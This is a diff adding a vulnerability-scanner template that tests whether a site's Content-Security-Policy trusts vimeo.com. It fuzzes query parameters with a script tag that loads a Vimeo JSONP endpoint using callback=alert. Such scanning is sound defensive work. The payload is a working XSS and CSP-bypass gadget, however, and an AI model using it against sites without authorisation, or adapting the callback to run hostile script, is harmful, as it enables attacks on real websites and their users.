@@ -1,0 +1,55 @@
+id: vimeo-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Vimeo
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,vimeo
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "vimeo.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: vimeo_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://vimeo.com/api/v2/video/1006042481.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "vimeo_csp_xss == true"
+# digest: 490a0046304402201c55ba8f9d0c8ad04c2135db8c20452f59281eeb960d76d9f0ca5f9f2b5f233302203da0fec70ce371b9d65d1140d4b4e51f1820f199866f205abbe3ecb26d69d6de:922c64590222798bb761d5b6d8e72950
